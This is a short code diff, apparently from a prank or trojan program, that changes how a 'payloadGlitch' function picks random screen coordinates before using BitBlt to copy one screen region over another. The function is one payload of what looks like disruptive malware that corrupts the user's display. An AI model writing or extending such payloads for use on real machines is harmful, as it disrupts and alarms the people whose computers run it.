@@ -62,12 +62,13 @@ PAYLOAD payloadSound() {
 PAYLOAD payloadGlitch() {
 	InitHDCs
 
-	int x1 = random() % (w - 100);
-	int y1 = random() % (h - 100);
-	int x2 = random() % (w - 100);
-	int y2 = random() % (h - 100);
 	int width = random() % 600;
 	int height = random() % 600;
+
+	int x1 = random() % (w - width);
+	int y1 = random() % (h - height);
+	int x2 = random() % (w - width);
+	int y2 = random() % (h - height);
 
 	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
 
